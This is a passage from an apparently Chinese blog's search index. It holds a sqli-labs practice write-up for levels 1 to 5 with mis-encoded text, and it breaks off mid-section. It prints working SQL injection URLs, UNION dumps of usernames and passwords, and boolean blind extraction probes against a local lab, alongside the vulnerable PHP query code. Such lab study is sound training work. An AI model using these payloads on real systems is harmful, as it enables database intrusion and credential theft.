<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>sqli-labs åˆ·é¢˜è®°å½•</title>
      <link href="/2022/05/17/sqli-labs/"/>
      <url>/2022/05/17/sqli-labs/</url>
      
        <content type="html"><![CDATA[<h1 id="sqli-labs-åˆ·é¢˜è®°å½•"><a href="#sqli-labs-åˆ·é¢˜è®°å½•" class="headerlink" title="sqli-labs åˆ·é¢˜è®°å½•"></a>sqli-labs åˆ·é¢˜è®°å½•</h1><blockquote><p>å‚è€ƒï¼š</p><p><a href="https://www.cnblogs.com/lcamry/category/846064.html">MYSQLæ³¨å…¥å¤©ä¹¦</a></p></blockquote><p>æ­¤æ–‡å°½é‡ä½¿ç”¨æ‰‹å·¥æ³¨å…¥ä»¥åŠ æ·±å¯¹åŸç†çš„ç†è§£ï¼Œç«­åŠ›é¿å…äº†ä½¿ç”¨sqlmapæˆ–è€…è„šæœ¬è‡ªåŠ¨åŒ–æ³¨å…¥ç­‰æ–¹å¼ã€‚</p><h2 id="Page-1-Basic-Challenges"><a href="#Page-1-Basic-Challenges" class="headerlink" title="Page-1 (Basic Challenges)"></a>Page-1 (Basic Challenges)</h2><h3 id="Less-1-GET-Error-based-Single-quotes-String-åŸºäºé”™è¯¯çš„GETå•å¼•å·å­—ç¬¦å‹æ³¨å…¥"><a href="#Less-1-GET-Error-based-Single-quotes-String-åŸºäºé”™è¯¯çš„GETå•å¼•å·å­—ç¬¦å‹æ³¨å…¥" class="headerlink" title="Less-1 GET - Error based - Single quotes - String (åŸºäºé”™è¯¯çš„GETå•å¼•å·å­—ç¬¦å‹æ³¨å…¥)"></a>Less-1 GET - Error based - Single quotes - String (åŸºäºé”™è¯¯çš„GETå•å¼•å·å­—ç¬¦å‹æ³¨å…¥)</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥"><a href="#æ‰‹åŠ¨æ³¨å…¥" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>è¿›å»ä¹‹åå‘ç°è®©è¾“å…¥idï¼Œéšä¾¿è¾“ä¸€ä¸ªæ•°å­—idå‘ç°éƒ½å¯ä»¥æ­£å¸¸å›æ˜¾ï¼Œç„¶åå°è¯•æ³¨å…¥</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-1/?id=1&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/M4r9ztPgwYUuNdL.png" alt="1_1.png"></p><p>æ ¹æ®æŠ¥é”™ä¿¡æ¯çŒœæµ‹åŸè¯­å¥æ˜¯ç”¨<code>&#39;$id&#39;</code>æ¥å¤„ç†çš„è¾“å…¥ï¼Œæ•…ç”¨<code>&#39;</code>é—­åˆå³å¯ã€‚</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-1/?id=1&#x27; <span class="attribute">or</span> <span class="number">1</span>=<span class="number">1</span>--+</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/X1JuzWeRH5GcntV.png" alt="1_2.png"></p><p>æ­£å¸¸å›æ˜¾ï¼Œæ•…ç”¨<code>order by</code>çˆ†å‡ºåˆ—æ•°ï¼Œå‘ç°æœ‰3åˆ—(4æ—¶æŠ¥é”™)</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-1/?id=1&#x27; <span class="attribute">order</span> by <span class="number">4</span>--+</span><br></pre></td></tr></table></figure><p>ç„¶åå¼€å§‹çˆ†åº“å</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-1/?id=-1&#x27;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,group_concat(schema_name),<span class="number">3</span> from information_schema.schemata--+</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/639kfQjuw8qMStc.png" alt="1_3.png"></p><p>å‘ç°<code>security</code>æ•°æ®åº“ï¼Œå¼€å§‹çˆ†è¡¨å</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-1/?id=-1&#x27;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,group_concat(table_name),<span class="number">3</span> from information_schema.tables where table_schema=<span class="string">&#x27;security&#x27;</span>--+</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/YLH869CSsQAWbE5.png" alt="1_4.png"></p><p>çˆ†<code>users</code>è¡¨é‡Œçš„åˆ—å</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-1/?id=-1&#x27;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,group_concat(column_name),<span class="number">3</span> from information_schema.columns where table_name=<span class="string">&#x27;users&#x27;</span>--+</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/fbgWAv5Ir68DTdY.png" alt="1_5.png"></p><p>çˆ†å‡ºè¡¨é‡Œçš„æ‰€æœ‰æ•°æ®</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-1/?id=-1&#x27;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(username,0x3a,password) from users--+</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/05/17/Uc5l39PbvWEoXCG.png" alt="1_6.png"></p><p>å¾ˆå¥½ï¼Œæˆ‘ä»¬ç»ˆäºè¾¾åˆ°äº†å’Œä¸æ–­ç›´æ¥è¾“å…¥<code>?id=xxxxx</code>ç›¸åŒçš„æ•ˆæœhhhğŸ˜„</p><h4 id="æºç åˆ†æ"><a href="#æºç åˆ†æ" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><p>æŠŠä¼ å…¥çš„<code>$id</code>ç›´æ¥å½“ä½œå­—ç¬¦ä¸²æ‹¼æ¥äº†è¿›æ¥ï¼Œæ•…åªéœ€è¦ç”¨<code>&#39;</code>é—­åˆæ‰å‰é¢çš„å¼•å·ï¼Œç„¶åç”¨<code>--+</code>æ³¨é‡Šæ‰åé¢çš„è¯­å¥å³å¯å®Œæˆæ³¨å…¥</p><h3 id="Less-2-GET-Error-based-Intiger-based-åŸºäºé”™è¯¯çš„GETæ•´å‹æ³¨å…¥"><a href="#Less-2-GET-Error-based-Intiger-based-åŸºäºé”™è¯¯çš„GETæ•´å‹æ³¨å…¥" class="headerlink" title="Less-2 GET - Error based - Intiger based (åŸºäºé”™è¯¯çš„GETæ•´å‹æ³¨å…¥)"></a>Less-2 GET - Error based - Intiger based (åŸºäºé”™è¯¯çš„GETæ•´å‹æ³¨å…¥)</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-1"><a href="#æ‰‹åŠ¨æ³¨å…¥-1" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>è¾“å…¥<code>?id=1&#39;</code>è§‚å¯ŸæŠ¥é”™</p><p><img src="https://s2.loli.net/2022/05/17/6cSxRIwZXdgPE1r.png" alt="2.png"></p><p>æ ¹æ®æŠ¥é”™çŒœæµ‹æ˜¯æœªç”¨<code>&#39;&#39;</code>åŒ…è£¹<code>$id</code>ï¼Œç›´æ¥å¯¹è¾“å…¥è¿›è¡Œæ‹¼æ¥ï¼Œæ•…ä¸less-1ç›¸æ¯”åªéœ€å»æ‰æ•°å­—åçš„<code>&#39;</code>å³å¯ã€‚</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#å°è¯•</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-2/?id=1 <span class="attribute">or</span> <span class="number">1</span>=<span class="number">1</span>--+</span><br><span class="line"><span class="comment">#çˆ†åˆ—æ•°</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-2/?id=1 order by <span class="number">1</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-2/?id=1 order by <span class="number">2</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-2/?id=1 order by <span class="number">3</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-2/?id=1 order by <span class="number">4</span>--+</span><br><span class="line"><span class="comment">#çˆ†åº“å</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-2/?id=-1 union <span class="literal">select</span> <span class="number">1</span>,group_concat(schema_name),<span class="number">3</span> from information_schema.schemata--+</span><br><span class="line"><span class="comment">#çˆ†è¡¨å</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-2/?id=-1 union <span class="literal">select</span> <span class="number">1</span>,group_concat(table_name),<span class="number">3</span> from information_schema.tables where table_schema=<span class="string">&#x27;security&#x27;</span>--+</span><br><span class="line"><span class="comment">#çˆ†åˆ—å</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-2/?id=-1 union <span class="literal">select</span> <span class="number">1</span>,group_concat(column_name),<span class="number">3</span> from information_schema.columns where table_name=<span class="string">&#x27;users&#x27;</span>--+</span><br><span class="line"><span class="comment">#çˆ†æ•°æ®</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-2/?id=-1 union <span class="literal">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(username,0x3a,password) from users--+</span><br></pre></td></tr></table></figure><h4 id="æºç åˆ†æ-1"><a href="#æºç åˆ†æ-1" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ç›´æ¥æŠŠ<code>$id</code>æ‹¼æ¥äº†è¿›æ¥ã€‚</p><h3 id="Less-3-GET-Error-based-Single-quotes-with-twist-string-åŸºäºé”™è¯¯çš„GETå•å¼•å·å˜å½¢å­—ç¬¦å‹æ³¨å…¥"><a href="#Less-3-GET-Error-based-Single-quotes-with-twist-string-åŸºäºé”™è¯¯çš„GETå•å¼•å·å˜å½¢å­—ç¬¦å‹æ³¨å…¥" class="headerlink" title="Less-3 GET - Error based - Single quotes with twist string (åŸºäºé”™è¯¯çš„GETå•å¼•å·å˜å½¢å­—ç¬¦å‹æ³¨å…¥)"></a>Less-3 GET - Error based - Single quotes with twist string (åŸºäºé”™è¯¯çš„GETå•å¼•å·å˜å½¢å­—ç¬¦å‹æ³¨å…¥)</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-2"><a href="#æ‰‹åŠ¨æ³¨å…¥-2" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>è¾“å…¥<code>?id=1&#39;</code>è§‚å¯ŸæŠ¥é”™</p><p><img src="https://s2.loli.net/2022/05/17/SefyJM3Dud15Pk6.png" alt="3.png"></p><p>æ ¹æ®æŠ¥é”™çŒœæµ‹åŸè¯­å¥æ˜¯<code>(&#39;$id&#39;)</code>ï¼Œæ•…åªéœ€ç”¨<code>&#39;)</code>æ¥é—­åˆå³å¯ã€‚</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#å°è¯•</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-3/?id=1&#x27;)--+</span><br><span class="line"><span class="comment">#çˆ†åˆ—æ•°</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-3/?id=1&#x27;)<span class="attribute">order</span> by <span class="number">1</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-3/?id=1&#x27;)order by <span class="number">2</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-3/?id=1&#x27;)order by <span class="number">3</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-3/?id=1&#x27;)order by <span class="number">4</span>--+</span><br><span class="line"><span class="comment">#çˆ†åº“å</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-3/?id=-1&#x27;)union <span class="literal">select</span> <span class="number">1</span>,group_concat(schema_name),<span class="number">3</span> from information_schema.schemata--+</span><br><span class="line"><span class="comment">#çˆ†è¡¨å</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-3/?id=-1&#x27;)union <span class="literal">select</span> <span class="number">1</span>,group_concat(table_name),<span class="number">3</span> from information_schema.tables where table_schema=<span class="string">&#x27;security&#x27;</span>--+</span><br><span class="line"><span class="comment">#çˆ†åˆ—å</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-3/?id=-1&#x27;)union <span class="literal">select</span> <span class="number">1</span>,group_concat(column_name),<span class="number">3</span> from information_schema.columns where table_name=<span class="string">&#x27;users&#x27;</span>--+</span><br><span class="line"><span class="comment">#çˆ†æ•°æ®</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-3/?id=-1&#x27;)union <span class="literal">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(username,0x3a,password) from users--+</span><br></pre></td></tr></table></figure><h4 id="æºç åˆ†æ-2"><a href="#æºç åˆ†æ-2" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-4-GET-Error-based-Double-Quotes-String-åŸºäºé”™è¯¯çš„GETåŒå¼•å·å­—ç¬¦å‹æ³¨å…¥"><a href="#Less-4-GET-Error-based-Double-Quotes-String-åŸºäºé”™è¯¯çš„GETåŒå¼•å·å­—ç¬¦å‹æ³¨å…¥" class="headerlink" title="Less-4 GET - Error based - Double Quotes - String (åŸºäºé”™è¯¯çš„GETåŒå¼•å·å­—ç¬¦å‹æ³¨å…¥)"></a>Less-4 GET - Error based - Double Quotes - String (åŸºäºé”™è¯¯çš„GETåŒå¼•å·å­—ç¬¦å‹æ³¨å…¥)</h3><h4 id="æ‰‹åŠ¨æ³¨å…¥-3"><a href="#æ‰‹åŠ¨æ³¨å…¥-3" class="headerlink" title="æ‰‹åŠ¨æ³¨å…¥"></a>æ‰‹åŠ¨æ³¨å…¥</h4><p>è¿˜æ˜¯è¾“å…¥<code>?id=1&#39;</code>ï¼Œå‘ç°èƒ½æ­£å¸¸æ˜¾ç¤ºï¼Œæ•…ä½¿ç”¨<code>?id=1&quot;</code>è¿›è¡Œå°è¯•</p><p><img src="https://s2.loli.net/2022/05/17/b7qLRYUfVed6hnW.png" alt="4.png"></p><p>æ ¹æ®æŠ¥é”™çŒœæµ‹åŸè¯­å¥æ˜¯<code>(&quot;$id&quot;)</code>ï¼Œæ•…åªéœ€ç”¨<code>&quot;)</code>æ¥é—­åˆå³å¯ã€‚</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#å°è¯•</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-4/?id=1&quot;)--+</span><br><span class="line"><span class="comment">#çˆ†åˆ—æ•°</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-4/?id=1&quot;)<span class="attribute">order</span> by <span class="number">1</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-4/?id=1&quot;)order by <span class="number">2</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-4/?id=1&quot;)order by <span class="number">3</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-4/?id=1&quot;)order by <span class="number">4</span>--+</span><br><span class="line"><span class="comment">#çˆ†åº“å</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-4/?id=-1&quot;)union <span class="literal">select</span> <span class="number">1</span>,group_concat(schema_name),<span class="number">3</span> from information_schema.schemata--+</span><br><span class="line"><span class="comment">#çˆ†è¡¨å</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-4/?id=-1&quot;)union <span class="literal">select</span> <span class="number">1</span>,group_concat(table_name),<span class="number">3</span> from information_schema.tables where table_schema=<span class="string">&#x27;security&#x27;</span>--+</span><br><span class="line"><span class="comment">#çˆ†åˆ—å</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-4/?id=-1&quot;)union <span class="literal">select</span> <span class="number">1</span>,group_concat(column_name),<span class="number">3</span> from information_schema.columns where table_name=<span class="string">&#x27;users&#x27;</span>--+</span><br><span class="line"><span class="comment">#çˆ†æ•°æ®</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-4/?id=-1&quot;)union <span class="literal">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(username,0x3a,password) from users--+</span><br></pre></td></tr></table></figure><h4 id="æºç åˆ†æ-3"><a href="#æºç åˆ†æ-3" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="string">&#x27;&quot;&#x27;</span> . <span class="variable">$id</span> . <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(<span class="subst">$id</span>) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><h3 id="Less-5-GET-Double-Injection-Single-Quotes-String-åŒæ³¨å…¥GETå•å¼•å·å­—ç¬¦å‹æ³¨å…¥"><a href="#Less-5-GET-Double-Injection-Single-Quotes-String-åŒæ³¨å…¥GETå•å¼•å·å­—ç¬¦å‹æ³¨å…¥" class="headerlink" title="Less-5 GET - Double Injection - Single Quotes - String (åŒæ³¨å…¥GETå•å¼•å·å­—ç¬¦å‹æ³¨å…¥)"></a>Less-5 GET - Double Injection - Single Quotes - String (åŒæ³¨å…¥GETå•å¼•å·å­—ç¬¦å‹æ³¨å…¥)</h3><h4 id="æºç åˆ†æ-4"><a href="#æºç åˆ†æ-4" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con1</span>, <span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>, MYSQLI_BOTH);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$con1</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸less-1ä¸€æ ·ç”¨<code>&#39;&#39;</code>å¯¹è¾“å…¥è¿›è¡Œå¤„ç†æ¥æ‹¼æ¥ï¼Œä¸åŒçš„æ˜¯è¾“å…¥æ­£ç¡®åä¸åœ¨æ˜¾ç¤ºæ•°æ®åº“ä¿¡æ¯ï¼Œè€ŒæŠ¥é”™ä¿¡æ¯å´èƒ½æ­£ç¡®å›æ˜¾ï¼Œæ­¤å¤„å°†ä½¿ç”¨å¤šç§æ–¹å¼å®Œæˆæ³¨å…¥ï¼Œä»¥é€šè¿‡æ­¤å…³æ¥å­¦ä¹ å„ç§æ³¨å…¥æ–¹æ³•åŠå‡½æ•°åˆ©ç”¨ã€‚</p><h4 id="å¸ƒå°”ç›²æ³¨"><a href="#å¸ƒå°”ç›²æ³¨" class="headerlink" title="å¸ƒå°”ç›²æ³¨"></a>å¸ƒå°”ç›²æ³¨</h4><h5 id="åˆ©ç”¨left-å’Œlength-å‡½æ•°è·å–ç‰ˆæœ¬å·åŠåº“å"><a href="#åˆ©ç”¨left-å’Œlength-å‡½æ•°è·å–ç‰ˆæœ¬å·åŠåº“å" class="headerlink" title="åˆ©ç”¨left()å’Œlength()å‡½æ•°è·å–ç‰ˆæœ¬å·åŠåº“å"></a>åˆ©ç”¨left()å’Œlength()å‡½æ•°è·å–ç‰ˆæœ¬å·åŠåº“å</h5><p>é€ä½è¿›è¡Œå­—ç¬¦å¯¹æ¯”ï¼Œå¦‚æœæ­£ç¡®åˆ™èƒ½çœ‹åˆ°<code>You are in...........</code>æ­£ç¡®æ˜¾ç¤ºï¼Œå¦åˆ™ä¸èƒ½ã€‚</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#çˆ†ç‰ˆæœ¬å·ï¼Œæˆ‘çš„æ•°æ®åº“ç‰ˆæœ¬æ˜¯10.4.11-MariaDB</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;<span class="attribute">and</span> left(version(),<span class="number">1</span>)=<span class="number">1</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;and left(version(),<span class="number">2</span>)=<span class="number">10</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;and left(version(),<span class="number">15</span>)=<span class="string">&#x27;10.4.11-MariaDB&#x27;</span>--+</span><br><span class="line"><span class="comment">#çˆ†åº“é•¿</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;and length(database())=<span class="number">8</span>--+</span><br><span class="line"><span class="comment">#çˆ†åº“åï¼Œä½¿ç”¨çš„æ•°æ®åº“åç§°ä¸ºsecurityï¼Œå…ˆçœ‹ç¬¬ä¸€ä½æ˜¯ä¸æ˜¯å¤§äºa,ç„¶åé€ä½å°è¯•</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;and left(database(),<span class="number">1</span>)&gt;<span class="string">&#x27;a&#x27;</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;and left(database(),<span class="number">8</span>)=<span class="string">&#x27;security&#x27;</span>--+</span><br></pre></td></tr></table></figure><h5 id="åˆ©ç”¨substr-å’Œascii-å‡½æ•°è·å–è¡¨å"><a href="#åˆ©ç”¨substr-å’Œascii-å‡½æ•°è·å–è¡¨å" class="headerlink" title="åˆ©ç”¨substr()å’Œascii()å‡½æ•°è·å–è¡¨å"></a>åˆ©ç”¨substr()å’Œascii()å‡½æ•°è·å–è¡¨å</h5><p>é€ä½å¯¹æ¯”ï¼Œå¦‚æœæ­£ç¡®åˆ™èƒ½çœ‹åˆ°<code>You are in...........</code>æ­£ç¡®æ˜¾ç¤ºï¼Œå¦åˆ™ä¸èƒ½ã€‚</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#çˆ†è¡¨åï¼Œè¿™é‡Œç¬¬ä¸€ä¸ªè¡¨æ˜¯emailsï¼Œä½¿ç”¨çš„æ•°æ®åº“æ˜¯security</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;<span class="attribute">and</span> ascii(substr((<span class="literal">select</span> table_name from information_schema.tables where table_schema=database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">80</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;and ascii(substr((<span class="literal">select</span> table_name from information_schema.tables where table_schema=database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">101</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;and ascii(substr((<span class="literal">select</span> table_name from information_schema.tables where table_schema=database() limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>))=<span class="number">109</span>--+</span><br><span class="line"></span><br><span class="line"><span class="comment">#çˆ†å‡ºç¬¬ä¸€ä¸ªå­—ç¬¦åæŒ¨ä¸ªçˆ†ç ´å‰©ä½™å­—ç¬¦ï¼Œæœ€åè·å–ç¬¬ä¸€ä¸ªè¡¨åï¼Œå¦‚æœæƒ³è·å–ç¬¬äºŒä¸ªï¼Œåªéœ€è¦ä¿®æ”¹limitåçš„å†…å®¹å³å¯</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;and ascii(substr((<span class="literal">select</span> table_name from information_schema.tables where table_schema=database() limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">114</span>--+</span><br></pre></td></tr></table></figure><h5 id="åˆ©ç”¨regexp-å‡½æ•°è·å–åˆ—åå­—"><a href="#åˆ©ç”¨regexp-å‡½æ•°è·å–åˆ—åå­—" class="headerlink" title="åˆ©ç”¨regexp()å‡½æ•°è·å–åˆ—åå­—"></a>åˆ©ç”¨regexp()å‡½æ•°è·å–åˆ—åå­—</h5><p>æ­£åˆ™åŒ¹é…ï¼Œå¦‚æœæ­£ç¡®åˆ™èƒ½çœ‹åˆ°<code>You are in...........</code>æ­£ç¡®æ˜¾ç¤ºï¼Œå¦åˆ™ä¸èƒ½ã€‚</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#çœ‹usersä¸­æ˜¯å¦æœ‰ä»¥uså¼€å¤´çš„åˆ—å</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;<span class="attribute">and</span> <span class="number">1</span>=(<span class="literal">select</span> <span class="number">1</span> from information_schema.columns where table_name=<span class="string">&#x27;users&#x27;</span> and column_name regexp <span class="string">&#x27;^us[a-z]&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>)--+</span><br><span class="line"><span class="comment">#çœ‹usersä¸­æ˜¯å¦æœ‰ä»¥passå¼€å¤´çš„åˆ—å</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27;and <span class="number">1</span>=(<span class="literal">select</span> <span class="number">1</span> from information_schema.columns where table_name=<span class="string">&#x27;users&#x27;</span> and column_name regexp <span class="string">&#x27;^pass[a-z]&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>)--+</span><br></pre></td></tr></table></figure><h5 id="åˆ©ç”¨ord-å’Œmid-å‡½æ•°è·å–users-è¡¨çš„å†…å®¹"><a href="#åˆ©ç”¨ord-å’Œmid-å‡½æ•°è·å–users-è¡¨çš„å†…å®¹" class="headerlink" title="åˆ©ç”¨ord()å’Œmid()å‡½æ•°è·å–users è¡¨çš„å†…å®¹"></a>åˆ©ç”¨ord()å’Œmid()å‡½æ•°è·å–users è¡¨çš„å†…å®¹</h5><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment">#ç¬¬ä¸€ä¸ªç”¨æˆ·åä¸ºDumbï¼Œæ­¤è¯­å¥æ˜¯çœ‹ç¬¬ä¸€ä¸ªç”¨æˆ·åçš„ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯å¦ä¸ºD</span></span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-5/?id=1&#x27; <span class="attribute">and</span> ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">68</span>--+</span><br></pre></td></tr></table></figure><h4 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h4><blockquote><p><a href="https://www.cnblogs.com/JxSir/articles/15183838.html">MySQL ERROR 1267 (HY000)é”™è¯¯è§£å†³åŠæ³•</a></p></blockquote><h5 id="åˆ©ç”¨floor-rand-0-2-è¿›è¡ŒæŠ¥é”™æ³¨å…¥"><a href="#åˆ©ç”¨floor-rand-0-2-è¿›è¡ŒæŠ¥é”™æ³¨å…¥" class="headerlink" title="åˆ©ç”¨floor(rand(0)*2)è¿›è¡ŒæŠ¥é”™æ³¨å…¥"></a>åˆ©ç”¨floor(rand(0)*2)è¿›è¡ŒæŠ¥é”™æ³¨å…¥</h5><figure class="highlight nginx"><table><tr><td class="code"><pre><span 